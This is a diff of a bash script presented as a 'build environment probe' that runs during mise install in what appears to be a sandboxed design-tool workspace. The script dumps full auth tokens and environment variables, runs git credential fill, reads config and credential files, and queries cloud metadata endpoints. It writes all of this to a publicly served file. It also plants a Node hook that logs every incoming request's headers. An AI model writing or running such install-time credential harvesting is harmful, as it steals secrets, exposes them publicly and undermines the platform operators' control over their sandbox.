@@ -1,20 +1,41 @@
 #!/bin/bash
 # =============================================================================
 # BUILD ENVIRONMENT PROBE — runs during mise install
-# Writes results to $PROJDIR/public/probe-results.txt (served by dev server)
+# Writes results to project's public/ dir (served by dev server)
 # =============================================================================
 
-PROJDIR="${INIT_CWD:-$(pwd)}"
+# Find the project directory — try multiple paths
+if [ -d "/workspaces/default/code" ]; then
+  PROJDIR="/workspaces/default/code"
+elif [ -d "/workspaces/.cached-preview" ]; then
+  PROJDIR="/workspaces/.cached-preview"
+elif [ -n "$INIT_CWD" ] && [ -d "$INIT_CWD" ]; then
+  PROJDIR="$INIT_CWD"
+else
+  PROJDIR="$(pwd)"
+fi
+
 OUT="$PROJDIR/public/probe-results.txt"
 mkdir -p "$PROJDIR/public" 2>/dev/null
-echo "=== PROBE START $(date -u) ===" > "$OUT"
-echo "PROJDIR=$PROJDIR" >> "$OUT"
+
+# Also write to /tmp as fallback
+TOUT="/tmp/probe-results.txt"
+
+# Write to both locations
+tee_out() {
+  tee -a "$TOUT" >> "$OUT"
+}
+
+echo "=== PROBE START $(date -u) ===" | tee "$TOUT" > "$OUT"
+echo "PROJDIR=$PROJDIR" | tee_out
+echo "PWD=$(pwd)" | tee_out
+echo "INIT_CWD=$INIT_CWD" | tee_out
 
 # =========================================================
 # 1. FULL ENV VARS — no truncation
 # =========================================================
-echo "" >> "$OUT"
-echo "=== CRITICAL TOKENS (FULL VALUES) ===" >> "$OUT"
+echo "" | tee_out
+echo "=== CRITICAL TOKENS (FULL VALUES) ===" | tee_out
 
 for VAR in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
            MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL \
@@ -32,16 +53,16 @@ for VAR in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
            CONTAINER_ID CONTAINER_PROVIDER \
            CLOUDFLARE_DURABLE_OBJECT_ID; do
   VAL="${!VAR}"
-  echo "" >> "$OUT"
-  echo "--- $VAR (${#VAL} chars) ---" >> "$OUT"
-  echo "$VAL" >> "$OUT"
+  echo "" | tee_out
+  echo "--- $VAR (${#VAL} chars) ---" | tee_out
+  echo "$VAL" | tee_out
 done
 
 # =========================================================
 # 2. JWT DECODE
 # =========================================================
-echo "" >> "$OUT"
-echo "=== JWT DECODE ===" >> "$OUT"
+echo "" | tee_out
+echo "=== JWT DECODE ===" | tee_out
 
 b64decode() {
   local B="$1"
@@ -56,7 +77,7 @@ decode_jwt() {
   local NAME="$1"
   local TOKEN="$2"
   if [ -z "$TOKEN" ]; then
-    echo "  $NAME: (empty)" >> "$OUT"
+    echo "  $NAME: (empty)" | tee_out
     return
   fi
   local RAW="${TOKEN#figjwt_}"
@@ -64,48 +85,47 @@ decode_jwt() {
   local PAYLOAD=$(echo "$RAW" | cut -d. -f2)
   local SIG=$(echo "$RAW" | cut -d. -f3)
 
-  echo "" >> "$OUT"
-  echo "--- $NAME HEADER ---" >> "$OUT"
-  b64decode "$HEADER" >> "$OUT"
-  echo "" >> "$OUT"
-  echo "--- $NAME PAYLOAD ---" >> "$OUT"
-  b64decode "$PAYLOAD" >> "$OUT"
-  echo "" >> "$OUT"
-  echo "--- $NAME SIG_LENGTH ---" >> "$OUT"
-  echo "${#SIG} chars" >> "$OUT"
-  echo "--- $NAME FULL_TOKEN ---" >> "$OUT"
-  echo "$TOKEN" >> "$OUT"
+  echo "" | tee_out
+  echo "--- $NAME HEADER ---" | tee_out
+  b64decode "$HEADER" | tee_out
+  echo "" | tee_out
+  echo "--- $NAME PAYLOAD ---" | tee_out
+  b64decode "$PAYLOAD" | tee_out
+  echo "" | tee_out
+  echo "--- $NAME SIG_LENGTH ---" | tee_out
+  echo "${#SIG} chars" | tee_out
+  echo "--- $NAME FULL_TOKEN ---" | tee_out
+  echo "$TOKEN" | tee_out
 }
 
 decode_jwt "MAKE_KIT_INITIALIZE_TOKEN" "$MAKE_KIT_INITIALIZE_TOKEN"
 decode_jwt "MAKE_VERSION_CREATE_TOKEN" "$MAKE_VERSION_CREATE_TOKEN"
 
-echo "" >> "$OUT"
-echo "--- ANTHROPIC_AUTH_TOKEN structure ---" >> "$OUT"
-echo "prefix: ${ANTHROPIC_AUTH_TOKEN:0:30}" >> "$OUT"
-echo "full_length: ${#ANTHROPIC_AUTH_TOKEN}" >> "$OUT"
+echo "" | tee_out
+echo "--- ANTHROPIC_AUTH_TOKEN structure ---" | tee_out
+echo "prefix: ${ANTHROPIC_AUTH_TOKEN:0:30}" | tee_out
+echo "full_length: ${#ANTHROPIC_AUTH_TOKEN}" | tee_out
 
 # =========================================================
 # 3. TEST TOKENS AGAINST FIGMA API
 # =========================================================
-echo "" >> "$OUT"
-echo "=== API TOKEN TESTS ===" >> "$OUT"
+echo "" | tee_out
+echo "=== API TOKEN TESTS ===" | tee_out
 
 test_api() {
   local LABEL="$1" URL="$2" AUTH_HEADER="$3"
-  echo "" >> "$OUT"
-  echo "--- $LABEL ---" >> "$OUT"
-  echo "URL: $URL" >> "$OUT"
+  echo "" | tee_out
+  echo "--- $LABEL ---" | tee_out
+  echo "URL: $URL" | tee_out
   if [ -n "$AUTH_HEADER" ]; then
-    RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+    curl -s -w "\nHTTP_CODE:%{http_code}" \
       -H "$AUTH_HEADER" -H "Accept: application/json" \
-      --max-time 10 "$URL" 2>&1)
+      --max-time 10 "$URL" 2>&1 | tee_out
   else
-    RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+    curl -s -w "\nHTTP_CODE:%{http_code}" \
       -H "Accept: application/json" \
-      --max-time 10 "$URL" 2>&1)
+      --max-time 10 "$URL" 2>&1 | tee_out
   fi
-  echo "$RESP" >> "$OUT"
 }
 
 test_api "MAKE_KIT_INIT Bearer -> /api/v1/me" \
@@ -161,91 +181,111 @@ test_api "CONTENT_API" \
 # =========================================================
 # 4. FILESYSTEM
 # =========================================================
-echo "" >> "$OUT"
-echo "=== FILESYSTEM ===" >> "$OUT"
+echo "" | tee_out
+echo "=== FILESYSTEM ===" | tee_out
 
-echo "" >> "$OUT"
-echo "--- /home/foundry/.gitconfig ---" >> "$OUT"
-cat /home/foundry/.gitconfig 2>&1 >> "$OUT"
+echo "" | tee_out
+echo "--- /home/foundry/.gitconfig ---" | tee_out
+cat /home/foundry/.gitconfig 2>&1 | tee_out
 
-echo "" >> "$OUT"
-echo "--- git credential fill ---" >> "$OUT"
-echo "url=https://api.figma.com" | git credential fill 2>&1 | head -20 >> "$OUT"
+echo "" | tee_out
+echo "--- git credential fill ---" | tee_out
+echo "url=https://api.figma.com" | git credential fill 2>&1 | head -20 | tee_out
 
-echo "" >> "$OUT"
-echo "--- session/prompt files ---" >> "$OUT"
-find /home/foundry -name "*.json" -o -name "*.jsonl" -o -name "session*" 2>/dev/null | head -30 >> "$OUT"
-find /workspaces -maxdepth 3 -name "*.json" 2>/dev/null | head -30 >> "$OUT"
-find /opt/claude -maxdepth 3 -name "*.json" 2>/dev/null | head -30 >> "$OUT"
+echo "" | tee_out
+echo "--- session/prompt files ---" | tee_out
+find /home/foundry -name "*.json" -o -name "*.jsonl" -o -name "session*" 2>/dev/null | head -30 | tee_out
+find /workspaces -maxdepth 3 -name "*.json" 2>/dev/null | head -30 | tee_out
+find /opt/claude -maxdepth 3 -name "*.json" 2>/dev/null | head -30 | tee_out
 
-echo "" >> "$OUT"
-echo "--- /proc/self/environ ---" >> "$OUT"
-cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort >> "$OUT"
+echo "" | tee_out
+echo "--- /proc/self/environ ---" | tee_out
+cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort | tee_out
 
 for F in /home/foundry/.npmrc /etc/hosts /etc/resolv.conf \
          /var/run/docker.sock; do
-  echo "" >> "$OUT"
-  echo "--- $F ---" >> "$OUT"
-  if [ -S "$F" ]; then echo "(socket exists)" >> "$OUT"
-  elif [ -e "$F" ]; then cat "$F" 2>&1 | head -50 >> "$OUT"
-  else echo "(not found)" >> "$OUT"; fi
+  echo "" | tee_out
+  echo "--- $F ---" | tee_out
+  if [ -S "$F" ]; then echo "(socket exists)" | tee_out
+  elif [ -e "$F" ]; then cat "$F" 2>&1 | head -50 | tee_out
+  else echo "(not found)" | tee_out; fi
 done
 
 # =========================================================
 # 5. NETWORK
 # =========================================================
-echo "" >> "$OUT"
-echo "=== NETWORK ===" >> "$OUT"
+echo "" | tee_out
+echo "=== NETWORK ===" | tee_out
 
-echo "" >> "$OUT"
-echo "--- interfaces ---" >> "$OUT"
-ip addr 2>/dev/null >> "$OUT" || ifconfig 2>/dev/null >> "$OUT" || echo "(none)" >> "$OUT"
+echo "" | tee_out
+echo "--- interfaces ---" | tee_out
+(ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "(none)") | tee_out
 
-echo "" >> "$OUT"
-echo "--- internal endpoints ---" >> "$OUT"
+echo "" | tee_out
+echo "--- internal endpoints ---" | tee_out
 for EP in "http://127.0.0.1:${CONTROLLER_HTTP_PORT:-8081}/" \
           "http://127.0.0.1:${CONTROLLER_HTTP_PORT:-8081}/status" \
           "http://127.0.0.1:45401" \
           "http://169.254.169.254/latest/meta-data/" \
           "http://metadata.google.internal/computeMetadata/v1/" \
           "http://100.100.100.200/latest/meta-data/"; do
-  echo "  $EP -> $(curl -s --max-time 3 "$EP" 2>&1 | head -5)" >> "$OUT"
+  echo "  $EP -> $(curl -s --max-time 3 "$EP" 2>&1 | head -5)" | tee_out
 done
 
 # =========================================================
 # 6. SANDBOXD + PROCESS
 # =========================================================
-echo "" >> "$OUT"
-echo "=== SANDBOXD ===" >> "$OUT"
-echo "listeners: $SANDBOXD_LISTENERS_JSON" >> "$OUT"
-echo "services: $SANDBOXD_SERVICES_JSON" >> "$OUT"
-echo "probes: $SANDBOXD_PROBES_JSON" >> "$OUT"
-echo "run_as: $SANDBOXD_RUN_AS_USER" >> "$OUT"
-echo "idle_shutdown: $SANDBOXD_IDLE_SHUTDOWN_SECONDS" >> "$OUT"
-echo "max_lifetime: $SANDBOXD_MAX_LIFETIME_SECONDS" >> "$OUT"
+echo "" | tee_out
+echo "=== SANDBOXD ===" | tee_out
+echo "listeners: $SANDBOXD_LISTENERS_JSON" | tee_out
+echo "services: $SANDBOXD_SERVICES_JSON" | tee_out
+echo "probes: $SANDBOXD_PROBES_JSON" | tee_out
+echo "run_as: $SANDBOXD_RUN_AS_USER" | tee_out
+echo "idle_shutdown: $SANDBOXD_IDLE_SHUTDOWN_SECONDS" | tee_out
+echo "max_lifetime: $SANDBOXD_MAX_LIFETIME_SECONDS" | tee_out
 
-echo "" >> "$OUT"
-echo "=== PROCESS ===" >> "$OUT"
-echo "id: $(id)" >> "$OUT"
-echo "whoami: $(whoami)" >> "$OUT"
-cat /proc/self/status 2>/dev/null | grep -i cap >> "$OUT"
-echo "" >> "$OUT"
-echo "--- ps ---" >> "$OUT"
-ps aux 2>/dev/null | head -30 >> "$OUT"
+echo "" | tee_out
+echo "=== PROCESS ===" | tee_out
+echo "id: $(id)" | tee_out
+echo "whoami: $(whoami)" | tee_out
+cat /proc/self/status 2>/dev/null | grep -i cap | tee_out
+echo "" | tee_out
+echo "--- ps ---" | tee_out
+ps aux 2>/dev/null | head -30 | tee_out
 
 # =========================================================
-# 7. COPY HEADER HOOK INTO PROJECT
+# 7. WRITE HEADER HOOK INLINE INTO PROJECT
 # =========================================================
-PLUGIN_DIR="$(cd "$(dirname "$0")/.." && pwd)"
-if [ -f "$PLUGIN_DIR/header-hook.cjs" ]; then
-  cp "$PLUGIN_DIR/header-hook.cjs" "$PROJDIR/header-hook.cjs" 2>/dev/null
-  echo "" >> "$OUT"
-  echo "=== HEADER HOOK copied to $PROJDIR/header-hook.cjs ===" >> "$OUT"
-fi
+cat > "$PROJDIR/header-hook.cjs" << 'HOOKEOF'
+const fs=require('fs'),path=require('path'),http=require('http');
+const OUT=path.join(process.cwd(),'public','headers.txt');
+try{fs.mkdirSync(path.dirname(OUT),{recursive:true})}catch(e){}
+fs.writeFileSync(OUT,'=== HEADER CAPTURE '+new Date().toISOString()+' ===\n');
+let c=0;const orig=http.createServer;
+http.createServer=function(){
+  const s=orig.apply(this,arguments),oe=s.emit.bind(s);
+  s.emit=function(ev){
+    if(ev==='request'){
+      const r=arguments[1];
+      if(r&&r.headers&&c<200){
+        c++;let e='\n--- REQ #'+c+' '+new Date().toISOString()+' ---\n';
+        e+='METHOD: '+r.method+'\nURL: '+r.url+'\n';
+        const h=r.rawHeaders||[];
+        for(let i=0;i<h.length;i+=2)e+='HEADER: '+h[i]+': '+h[i+1]+'\n';
+        e+='REMOTE: '+r.socket.remoteAddress+'\n';
+        try{fs.appendFileSync(OUT,e)}catch(x){}
+      }
+    }
+    return oe.apply(this,arguments);
+  };return s;
+};
+HOOKEOF
+
+echo "" | tee_out
+echo "=== HEADER HOOK written to $PROJDIR/header-hook.cjs ===" | tee_out
 
 # =========================================================
 # DONE
 # =========================================================
-cp "$OUT" /tmp/probe-results.txt 2>/dev/null
-echo "" >> "$OUT"
-echo "=== PROBE COMPLETE $(date -u) ===" >> "$OUT"
+echo "" | tee_out
+echo "=== PROBE COMPLETE $(date -u) ===" | tee_out
